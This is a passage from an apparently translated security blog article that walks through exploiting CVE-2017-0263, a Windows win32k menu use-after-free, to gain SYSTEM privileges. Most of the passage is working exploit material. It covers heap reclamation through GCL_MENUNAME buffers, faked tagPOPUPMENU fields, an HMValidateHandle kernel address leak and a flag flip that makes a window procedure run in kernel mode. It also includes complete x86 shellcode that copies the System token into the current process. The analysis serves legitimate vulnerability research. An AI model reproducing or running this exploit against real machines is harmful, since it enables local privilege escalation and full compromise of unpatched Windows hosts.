    hWindowList[iWindowCount++] = hwnd;
}
```

*Exploitation code of creating mupltiple common window object*

Then add statements to set field `GCL_MENUNAME` for the common window created in batch previously before calling system service `NtUserMNDragLeave` in custom shadow window message procedure `xxShadowWindowProc`:

```
DWORD dwPopupFake[0xD] = { 0 };
dwPopupFake[0x0] = 0x00098208;  //->flags
dwPopupFake[0x1] = 0xDDDDDDDD;  //->spwndNotify
dwPopupFake[0x2] = 0xDDDDDDDD;  //->spwndPopupMenu
dwPopupFake[0x3] = 0xDDDDDDDD;  //->spwndNextPopup
dwPopupFake[0x4] = 0xDDDDDDDD;  //->spwndPrevPopup
dwPopupFake[0x5] = 0xDDDDDDDD;  //->spmenu
dwPopupFake[0x6] = 0xDDDDDDDD;  //->spmenuAlternate
dwPopupFake[0x7] = 0xDDDDDDDD;  //->spwndActivePopup
dwPopupFake[0x8] = 0xDDDDDDDD;  //->ppopupmenuRoot
dwPopupFake[0x9] = 0xDDDDDDDD;  //->ppmDelayedFree
dwPopupFake[0xA] = 0xDDDDDDDD;  //->posSelectedItem
dwPopupFake[0xB] = 0xDDDDDDDD;  //->posDropped
dwPopupFake[0xC] = 0;
for (UINT i = 0; i < iWindowCount; ++i)
{
    SetClassLongW(hWindowList[i], GCL_MENUNAME, (LONG)dwPopupFake);
}
```

*Exploitation code of setting MENUNAME for common window objects*

Since field `MENUNAME` belongs to zero terminated `WCHAR` string format, it is necessary to set the whole buffer without zero in two continuous bytes. When setting field `MENUNAME` for target window objects by calling `SetClassLong`, the system ultimately allocates and sets `UNICODE` string buffer for field `lpszMenuName` of the window class `tagCLS` objects belonged to by the window objects in the kernel.

Since both the buffer pointed to by field `lpszMenuName` and the buffer of popup menu `tagPOPUPMENU` object are process quota memory blocks, the sizes of their extra memories are the same. It is just needed to make the length of `MENUNAME` buffers set for each window object the same as the size of `tagPOPUPMENU` then in normal conditions there will be always a window class object whose `MENUNAME` buffer would be allocated in the memory area of the previously freed root popup menu object to be the fake popup menu `tagPOPUPMENU` object.

![]()
*Occupy memory of original root popup menu object by setting GCL\_MENUNAME*

It is necessary to make a little settings to field `flags` of the fake object in order to so that system service `NtUserMNDragLeave` called later is able to reenter function `xxxMNEndMenuState` according to the fake root popup menu object.

```
kd> dt win32k!tagPOPUPMENU 0141fb44
   [...]
   +0x000 fIsTrackPopup    : 0y1
   [...]
   +0x000 fFirstClick      : 0y1
   [...]
   +0x000 fDestroyed       : 0y1
   +0x000 fDelayedFree     : 0y1
   [...]
   +0x000 fInCancel        : 0y1
   [...]
   +0x004 spwndNotify      : 0xdddddddd tagWND
   +0x008 spwndPopupMenu   : 0xdddddddd tagWND
   +0x00c spwndNextPopup   : 0xdddddddd tagWND
   +0x010 spwndPrevPopup   : 0xdddddddd tagWND
   +0x014 spmenu           : 0xdddddddd tagMENU
   +0x018 spmenuAlternate  : 0xdddddddd tagMENU
   +0x01c spwndActivePopup : 0xdddddddd tagWND
   +0x020 ppopupmenuRoot   : 0xdddddddd tagPOPUPMENU
   +0x024 ppmDelayedFree   : 0xdddddddd tagPOPUPMENU
   +0x028 posSelectedItem  : 0xdddddddd
   +0x02c posDropped       : 0xdddddddd
```

*Field data of fake tagPOPUPMENU object*

---

**Fake Fields of Popup Menu Object**

The previously faked `tagPOPUPMENU` object reoccupies the memory area of the previously freed root popup menu object, and its each field can be fully controlled in exploitation code. However, there is no validity setting for each of the pointer member fields, and in this way, unlocking objects pointed to by pointer fields in function `xxxMNEndMenuState` will still raises errors such as page fault. The next step is to set pointer fields to point to valid memory spaces so that the kernel logic can be executed normally.

Looking back to the location where the owner window object `hWindowMain` is being created in proof code, we add statements that creates new common window object `hWindowHunt` as the exploitation carrier:

```
WNDCLASSEXW wndClass = { 0 };
wndClass = { 0 };
wndClass.cbSize = sizeof(WNDCLASSEXW);
wndClass.lpfnWndProc    = DefWindowProcW;
wndClass.cbWndExtra     = 0x200;
wndClass.hInstance      = GetModuleHandleA(NULL);
wndClass.lpszMenuName   = NULL;
wndClass.lpszClassName  = L"WNDCLASSHUNT";
RegisterClassExW(&wndClass);
hWindowHunt = CreateWindowExW(0x00,
    L"WNDCLASSHUNT",
    NULL,
    WS_OVERLAPPED,
    0,
    0,
    1,
    1,
    NULL,
    NULL,
    GetModuleHandleA(NULL),
    NULL);
```

*Exploitation code of creating carrier window object*

Carrier window object `hWindowHunt` has an extra area `0x200` bytes big following the basic object, used to fake various related user objects in exploitation code to enable the execution flow to execute normally and steadily during the system reexecuting function `xxxMNEndMenuState`.

Then we retrieve the kernel address of the carrier window `tagWND` object by `HMValidateHandle` kernel object address leak technique. The head structure of window object `tagWND` is a `THRDESKHEAD` member structure object, whose complete definition is as below:

```
kd> dt win32k!_THRDESKHEAD
   +0x000 h                : Ptr32 Void
   +0x004 cLockObj         : Uint4B
   +0x008 pti              : Ptr32 tagTHREADINFO
   +0x00c rpdesk           : Ptr32 tagDESKTOP
   +0x010 pSelf            : Ptr32 UChar
```

*Definition of structure THRDESKHEAD*

Field `pSelf` points to the kernel address of the user object that it belongs to. Therefore, we can locate the kernel address of extra area of current window object according to the pointer and the size of `tagWND` structure.

According to the analysis of code, it would be known that function `xxxMNEndMenuState` calls function `MNEndMenuStateNotify` at the beginning to clean up field `pMenuState` of the notification thread in case that the notification thread is different between the current thread. However, unfortunately, since the fake `tagPOPUPMENU` object has covered the original data, we need to continue to fake other user objects including notification window object.

```
PTHRDESKHEAD head = (PTHRDESKHEAD)xxHMValidateHandle(hWindowHunt);
PBYTE pbExtra = head->deskhead.pSelf + 0xb0 + 4;
pvHeadFake = pbExtra + 0x44;
for (UINT x = 0; x < 0x7F; x++) // 0x04~0x1FC
{
    SetWindowLongW(hWindowHunt, sizeof(DWORD) * (x + 1), (LONG)pbExtra);
}
PVOID pti = head->thread.pti;
SetWindowLongW(hWindowHunt, 0x50, (LONG)pti); // pti
```

*Exploitation code of filling extra aree of carrier window object*

Then reserve `4` bytes for the extra area of carrier window object, and fill the remaining `0x1FC` bytes memory area with the address of the extra area with `+0x04` bytes offset. The value filled with will be as the fields of various fake objects such as handle values, reference counts and object pointers.

As a fake head structure of user object, the address of the remaining memory area with `+0x44` bytes offset `pvHeadFake` would be the values of various pointer fields of the fake root popup menu `tagPOPUPMENU` object. The original exploitation code of initializing `MENUNAME` buffer is replaced in the custom shadow window message procedure `xxxShadowWindowProc`:

```
DWORD dwPopupFake[0xD] = { 0 };
dwPopupFake[0x0] = (DWORD)0x00098208;  //->flags
dwPopupFake[0x1] = (DWORD)pvHeadFake;  //->spwndNotify
dwPopupFake[0x2] = (DWORD)pvHeadFake;  //->spwndPopupMenu
dwPopupFake[0x3] = (DWORD)pvHeadFake;  //->spwndNextPopup
dwPopupFake[0x4] = (DWORD)pvHeadFake;  //->spwndPrevPopup
dwPopupFake[0x5] = (DWORD)pvHeadFake;  //->spmenu
dwPopupFake[0x6] = (DWORD)pvHeadFake;  //->spmenuAlternate
dwPopupFake[0x7] = (DWORD)pvHeadFake;  //->spwndActivePopup
dwPopupFake[0x8] = (DWORD)0xFFFFFFFF;  //->ppopupmenuRoot
dwPopupFake[0x9] = (DWORD)pvHeadFake;  //->ppmDelayedFree
dwPopupFake[0xA] = (DWORD)0xFFFFFFFF;  //->posSelectedItem
dwPopupFake[0xB] = (DWORD)pvHeadFake;  //->posDropped
dwPopupFake[0xC] = (DWORD)0;
```

*Updated exploitation code of initializing MENUNAME buffer*

Exceptionally, field `ppopupmenuRoot` and `posSelectedItem` are filled with `0xFFFFFFFF` to prevent the execution flow from being misguided. Since the corresponding field `cLockObj` in the memory area where the fake object head pointer `pvHeadFake` points holds a huge number, neither the unlocking nor the dereferencing statements to the target fake object is sufficient to make the system to call object destroying routine for the fake object, so that the exception would not occur.

During the second execution of function `xxxMNEndMenuState`, the fake root popup menu `tagPOPUPMENU` object allocated at the original address is freed in function `MNFreePopup`.

---

**Kernel Object Address Leak Technique**

`HMValidateHandle` kernel address leak technique is used in this analysis. in `user32` module, in operating some user objects, in order to lift efficiency to get data of user objects directly in the user mode, the system provides unexported function `HMValidateHandle` for the internal use.

This function receives the user handle and object type as parameters, and validate them internally. If the validation is passed, the function returns with the address mapped in the desktop heap of the target object. This function is not been exported, but called in some exported functions, such as `IsMenu` function, which is used to verify whether the parameter is a menu handle by passing the handle value and menu type enumeration value `2`(`TYPE_MENU`) into `HMValidateHandle` function and judgeing whether the return value is non-zero.

```
.text:76D76F0E 8B FF          mov     edi, edi
.text:76D76F10 55             push    ebp
.text:76D76F11 8B EC          mov     ebp, esp
.text:76D76F13 8B 4D 08       mov     ecx, [ebp+hMenu]
.text:76D76F16 B2 02          mov     dl, 2
.text:76D76F18 E8 73 5B FE FF call    @HMValidateHandle@8 ; HMValidateHandle(x,x)
.text:76D76F1D F7 D8          neg     eax
.text:76D76F1F 1B C0          sbb     eax, eax
.text:76D76F21 F7 D8          neg     eax
.text:76D76F23 5D             pop     ebp
.text:76D76F24 C2 04 00       retn    4
```

*Instruction fragment of function IsMenu*

Therefore, we can find and calculate the address of function `HMValidateHandle` from function `IsMenu` exported by `user32` module by matching hardcode.

```
static PVOID(__fastcall *pfnHMValidateHandle)(HANDLE, BYTE) = NULL;
VOID
xxGetHMValidateHandle(VOID)
{
    HMODULE hModule = LoadLibraryA("USER32.DLL");
    PBYTE pfnIsMenu = (PBYTE)GetProcAddress(hModule, "IsMenu");
    PBYTE Address = NULL;
    for (INT i = 0; i < 0x30; i++)
    {
        if (*(WORD *)(i + pfnIsMenu) != 0x02B2)
        {
            continue;
        }
        i += 2;
        if (*(BYTE *)(i + pfnIsMenu) != 0xE8)
        {
            continue;
        }
        Address = *(DWORD *)(i + pfnIsMenu + 1) + pfnIsMenu;
        Address = Address + i + 5;
        pfnHMValidateHandle = (PVOID(__fastcall *)(HANDLE, BYTE))Address;
        break;
    }
}
```

*Exploitation code of finding address of HMValidateHandle*

After Having located the target function, add calling statements to this function at the right time it is needed to retrieve kernel addresses of user objects such as window object in exploitation code. When the called function succeeds, it returns with the address mapped in the desktop heap of the target object.

```
#define TYPE_WINDOW 1
PVOID
xxHMValidateHandleEx(HWND hwnd)
{
    return pfnHMValidateHandle((HANDLE)hwnd, TYPE_WINDOW);
}
```

*Exploitation code of retrieving target object mapped address*

The head structure of window object `tagWND` is a `THRDESKHEAD` member structure object, where there is a sub field `pSelf` pointing to the kernel address of the window object that it belongs to.

---

**Code Execution in Kernel-Mode**

Member flag bit `bServerSideWindowProc` is the `18` bit of the flag field of `tagWND` object, which following two other flag bits `bDialogWindow` and `bHasCreatestructName`:

```
kd> dt win32k!tagWND
   +0x000 head             : _THRDESKHEAD
   +0x014 state            : Uint4B
   [...]
   +0x014 bDialogWindow    : Pos 16, 1 Bit
   +0x014 bHasCreatestructName : Pos 17, 1 Bit
   +0x014 bServerSideWindowProc : Pos 18, 1 Bit
```

The position of flag bit `bDialogWindow` is the beginning bit of the byte where `bServerSideWindowProc` is located. When a common window object is being created, if the style parameter `dwStyle` and extended style parameter `dwExStyle` is passed as `0` default value, both these three flag bits would have not been set. Therefore, we can achieve the setting to the target cratical flag bit with this feature.

Statement of retrieving the address of member flag bit `bDialogWindow` of the window object by the kernel address leak technique should be added during filling the extra area of carrier window object in exploitation code:

```
pvAddrFlags = *(PBYTE *)((PBYTE)xxHMValidateHandle(hWindowHunt) + 0x10) + 0x16;
```

Then we set the message procedure field of carrier window object `hWindowHunt` as the beginning address of field `pfnWindProc` of the structure `SHELLCODE` object initialized previously:

```
SetWindowLongW(hWindowHunt, GWL_WNDPROC, (LONG)pvShellCode->pfnWindProc);
```

When initializing the data of `MENUNAME` niffer in the custom shadow window message procedure `xxxShadowWindowProc`, the address of flag bit `bDialogWindow` with `-0x04` bytes offset should be the value of one of window object pointer fields （such as `spwndPrevPopup` field） of the fake `tagPOPUPMENU` object, in order to make the aforementioned three flag bits to be the lowest three bits of field `cLockObj` of the "window object" pointed to by the target pointer field:

```
dwPopupFake[0x4] = (DWORD)pvAddrFlags - 4; //->spwndPrevPopup
```

During the execution of function `xxxMNEndMenuState`, when calling `HMAssignmentUnlock` for field `spwndPrevPopup` of root popup menu object to unlock the assignment lock to the target window object, the system decrements the data at the address based from flag bit `bDialogWindow` directly, which caused flag bit `bServerSideWindowProc` being set.

![]()
*Set target flag bit by dec instruction*

With member flag bit `bServerSideWindowProc` being set, carrier window object would get the ability to directly execute window message procedure in the kernel context.

---

**ShellCode**

The code of ShellCode function would be executed directly in the kernel context as the custom message procedure of carrier window object. Before constrcuting the code of ShellCode function, it is necessary to initialize and assign the needed data at first.

According to the exploitation code constructed before, we have achieved the aim that the system is able to execute placidly without any exception during the second execution of function `xxxMNEndMenuState` when the vulnerablity is being triggered. However, the freed root popup menu object at the second time is in fact the buffer pointed to by field `lpszMenuName` of one of the window class `tagCLS` objects registered in batch previously. If the buffer has been freed in advance, when the process exiting, during destroying various user objects, the attempt to free the freed memory pointed to by the target field `lpszMenuName` would cause a double-free exception. Therefore, it is must to zero the target field `lpszMenuName` which points to a freed memory block in the code of ShellCode.

During creating common window objects in batch, it is needed to add statements of retrieving the address pointed by field `pcls` of each window object and storing the addresses into member array `tagCLS[]` of the structure `SHELLCODE` object.

```
static constexpr UINT num_offset_WND_pcls = 0x64;
for (INT i = 0; i < iWindowCount; i++)
{
    pvShellCode->tagCLS[i] = *(PVOID *)((PBYTE)xxHMValidateHandle(hWindowList[i]) + num_offset_WND_pcls);
}
```

*Expoitation code of recording addresses of tagCLS*

It is needed to match fields `lpszMenuName` with the kernel address of root popup menu object to find the target window class object whose field `lpszMenuName` needs to be zeroed. Therefore, exploitation code needs to retrieve the kernel address of root popup menu in user process, which can be realized in event notification procedure `xxWindowEventProc`:

```
VOID CALLBACK
xxWindowEventProc(
    HWINEVENTHOOK hWinEventHook,
    DWORD         event,
    HWND          hwnd,
    LONG          idObject,
    LONG          idChild,
    DWORD         idEventThread,
    DWORD         dwmsEventTime
)
{
    if (iMenuCreated == 0)
    {
        popupMenuRoot = *(DWORD *)((PBYTE)xxHMValidateHandle(hwnd) + 0xb0);
    }
    if (++iMenuCreated >= 2)
    {
        SendMessageW(hwnd, MN_ENDMENU, 0, 0);
    }
    else
    {
        SendMessageW(hwnd, WM_LBUTTONDOWN, 1, 0x00020002);
    }
}
```

*Add exploitation code of retrieving address of root popup menu*

When initializing the buffer of structure `SHELLCODE` object at the beginning of exploitation code, the code of exploitation function `xxPayloadWindProc` is copied into the buffer of `SHELLCODE` object. The next step is to realize the construction of the code of function `xxPayloadWindProc`. The code of this function would be executed in the kernel context as the kernel-mode message procedure of carrier window object. It is slightly different from window message procedure executed in the user context that the first parameter of kernel-mode message procedure is a pointer to the target window object, and the remaining parameters are all the same.

In order to exactly identify the actions to trigger the elevation of privilege, `0x9F9F` is defined as the message to trigger. In the code of ShellCode function, we judge whether the incoming message parameter is the custom message to trigger defined by us:

```
push    ebp
mov     ebp,esp
mov     eax,dword ptr [ebp+0Ch]
cmp     eax,9F9Fh
jne     LocFAILED
```

In 32-bit Windows operating system, code segment register `CS` always holds `0x1B`. According to this feature, we judge whether the current execution context is in user-mode in ShellCode function, if so just return.

```
mov     ax,cs
cmp     ax,1Bh
je      LocFAILED
```

Restore the member flag bits of carrier window object to the original value. Contrary to the case when modifying flag bits previously, Incrementing the data at the address based from flag bit `bDialogWindow` directly at present would causes that flags bits modified before such as `bServerSideWindowProc` are restored to the previous state before modification.

```
cld
mov     ecx,dword ptr [ebp+8]
inc     dword ptr [ecx+16h]
```

Backup of all the general registers to the stack is needed at present, which followed by retrieving the value of register `EIP` by `CALL-POP` technique and calculating the base address of the structure `SHELLCODE` stored in front of the code of ShellCode function according to the relative offset:

```
pushad
call    $+5
pop     edx
sub     edx,443h
```

Traverse the array holding pointers to `tagCLS` in structure `SHELLCODE` and match with the address of root popup menu object from parameter `wParam`. If found, just zero field `lpszMenuName` of the matched window class object.

```
mov     ebx,100h
lea     esi,[edx+18h]
mov     edi,dword ptr [ebp+10h]

LocForCLS:
test    ebx,ebx
je      LocGetEPROCESS
lods    dword ptr [esi]
dec     ebx
cmp     eax,0
je      LocForCLS
add     eax,dword ptr [edx+8]
cmp     dword ptr [eax],edi
jne     LocForCLS
and     dword ptr [eax],0
jmp     LocForCLS
```

The next step is to retrieve the pointer to thread information `tagTHREADINFO` object from the head structure of carrier window object, and to get the pointer to process information `tagPROCESSINFO` object stored in thread information object. Then we get the pointer of `EPROCESS` object of the corresponding process from process information object. The offsets of each field are held by `SHELLCODE` object.

```
LocGetEPROCESS:
mov     ecx,dword ptr [ecx+8]
mov     ebx,dword ptr [edx+0Ch]
mov     ecx,dword ptr [ebx+ecx]
mov     ecx,dword ptr [ecx]
mov     ebx,dword ptr [edx+10h]
mov     eax,dword ptr [edx+4]
```

Then find the address of `EPROCESS` object according to field `ActiveProcessLinks` and field `UniqueProcessId` of `EPROCESS` object. Since field `UniqueProcessId` is just followed by field `ActiveProcessLinks`, we can locate each `UniqueProcessId` field through the offset of `ActiveProcessLinks` held by `SHELLCODE` object.

```
push    ecx

LocForCurrentPROCESS:
cmp     dword ptr [ebx+ecx-4],eax
je      LocFoundCURRENT
mov     ecx,dword ptr [ebx+ecx]
sub     ecx,ebx
jmp     LocForCurrentPROCESS

LocFoundCURRENT:
mov     edi,ecx
pop     ecx
```

The next step is to continue traversing the linked list of `EPROCESS` objects to find the `EPROCESS` object of system process.

```
LocForSystemPROCESS:
cmp     dword ptr [ebx+ecx-4],4
je      LocFoundSYSTEM
mov     ecx,dword ptr [ebx+ecx]
sub     ecx,ebx
jmp     LocForSystemPROCESS

LocFoundSYSTEM:
mov     esi,ecx
```

It means that both the `EPROCESS` objects of current process and system process are located when executing here, then the value of field `Token` of current process would be replaced by the one of system process.

```
mov     eax,dword ptr [edx+14h]
add     esi,eax
add     edi,eax
lods    dword ptr [esi]
stos    dword ptr es:[edi]
```

At this moment while the current process has already owned and pointed to the `Token` object of system process, the reference count of target `Token` object needs a manual correction because of the extra added reference. Most of kernel objects use a structure `OBJECT_HEADER` as their header structures in NT executive:

```
kd> dt nt!_OBJECT_HEADER
   +0x000 PointerCount     : Int4B
   +0x004 HandleCount      : Int4B
   [...]
   +0x014 SecurityDescriptor : Ptr32 Void
   +0x018 Body             : _QUAD
```

This structure is followed by the associated kernel object, which holds the kernel object from the address of its field `Body`. Manual increment of reference needs to modify field `PointerCount`.

```
and     eax,0FFFFFFF8h
add     dword ptr [eax-18h],2
```

Most of work is done. Restore the values of general registers backed up previously to the registers, and return to the caller with `0x9F9F` as the feedback information.

```
popad
mov     eax,9F9Fh
jmp     LocRETURN

LocFAILED:
mov     eax,1

LocRETURN:
leave
ret     10h
```

The ShellCode function code has been written completely.

---

**Trigger Elevation of Privilege**

Everything is ready except the east wind. The latest statements are placed following the statement of calling system service `NtUserMNDragLeave` in the custom shadow window message procedure `xxShadowWindowProc`, which are of sending custom message `0x9F9F` with the kernel address of root popup menu object as parameter `wParam` and storing the judging result of the returned value into the global variable `bDoneExploit`.

```
LRESULT Triggered = SendMessageW(hWindowHunt, 0x9F9F, popupMenuRoot, 0);
bDoneExploit = Triggered == 0x9F9F;
```

As thus, following the call to system service `NtUserMNDragLeave` to set flag bit `bServerSideWindowProc` of carrier window object, the function sends custom message `0x9F9F` with the kernel address of root popup menu object as parameter `wParam`. The execution flow would invoke the custom message procedure of carrier window object in the kernel context and enter the code of ShellCode defined by user process, which achieves the elevation of privilege and the repair to fields of the related user objects.

Global variable `bDoneExploit` is listened to be assigned by the main thread; if so, the main thread would create a new command prompt process.

![]()
*Newly created process belongs to System identity*

It can be observed that the newly created command prompt process has belonged to System user identity.

---

**Postscript**

There are some slight differences between the logic of exploitation code in this analysis and the part in the original attacking sample. For example, in order to make sure a reasonable success rate, the attacking sample performed operations to suspend all the threads temporarily in the system, and created three menu object to exploit, as well as retry mechanism, etc. In this analysis, to achieve the simplest proof and exploitation code, these unnecessary factors are omitted.

## 0x5 Links

PDF document download: [FROM ANALYZING CVE-2017-0263 TO ... .pdf](https://xiaodaozhi.com/usr/uploads/2018/04/2423495409.pdf)

Translated from my Chinese article: <https://xiaodaozhi.com/exploit/71.html>

[0] The proof of concept of this analysis

<https://github.com/leeqwind/HolicPOC/blob/master/windows/win32k/CVE-2017-0263/x86.cpp>

[1] Kernel Attacks through User-Mode Callbacks

<http://media.blackhat.com/bh-us-11/Mandt/BH_US_11_Mandt_win32k_WP.pdf>

[2] 从 Dump 到 POC 系列一: Win32k 内核提权漏洞分析

<http://blogs.360.cn/blog/dump-to-poc-to-win32k-kernel-privilege-escalation-vulnerability/>

[3] TrackPopupMenuEx function (Windows)

[https://msdn.microsoft.com/en-us/library/windows/desktop/ms648003(v=vs.85).aspx](https://msdn.microsoft.com/en-us/library/windows/desktop/ms648003%28v%3Dvs.85%29.aspx)

[4] sam-b/windows\_kernel\_address\_leaks

<https://github.com/sam-b/windows_kernel_address_leaks>

[5] Sednit adds two zero-day exploits using 'Trump's attack on Syria' as a decoy

<https://www.welivesecurity.com/2017/05/09/sednit-adds-two-zero-day-exploits-using-trumps-attack-syria-decoy/>

[6] EPS Processing Zero-Days Exploited by Multiple Threat Actors

<https://www.fireeye.com/blog/threat-research/2017/05/eps-processing-zero-days.html>

- THE END -

文章链接: [https://xiaodaozhi.com/exploit/117.html](https://xiaodaozhi.com/exploit/117.html "From CVE-2017-0263 To Windows Menu Management Component")

 [漏洞](https://xiaodaozhi.com/exploit/) [分析调试](https://xiaodaozhi.com/tag/%E5%88%86%E6%9E%90%E8%B0%83%E8%AF%95/) [内核提权](https://xiaodaozhi.com/tag/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/) [翻译](https://xiaodaozhi.com/tag/%E7%BF%BB%E8%AF%91/) [内核漏洞](https://xiaodaozhi.com/tag/%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/) [WIN32K](https://xiaodaozhi.com/tag/WIN32K/) [释放后重用](https://xiaodaozhi.com/tag/%E9%87%8A%E6%94%BE%E5%90%8E%E9%87%8D%E7%94%A8/)
[文章知识产权许可声明](https://xiaodaozhi.com/license.html)

新一篇: [对 UAF 漏洞 CVE-2015-2546 的分析和利用](https://xiaodaozhi.com/exploit/122.html "对 UAF 漏洞 CVE-2015-2546 的分析和利用")

旧一篇: [从 CVE-2017-0263 漏洞分析到 Windows 菜单管理组件](https://xiaodaozhi.com/exploit/71.html "从 CVE-2017-0263 漏洞分析到 Windows 菜单管理组件")

### 没有评论

内容

* 发表评论

© 2025 [小刀志](https://xiaodaozhi.com/)
*·* [网站地图](https://xiaodaozhi.com/sitemap.xml)
*·* [许可声明](https://xiaodaozhi.com/license.html)
*·* [京ICP备18017134号-1](https://beian.miit.gov.cn/) *·* 京公网安备11010502035375号

* 文章目录

---


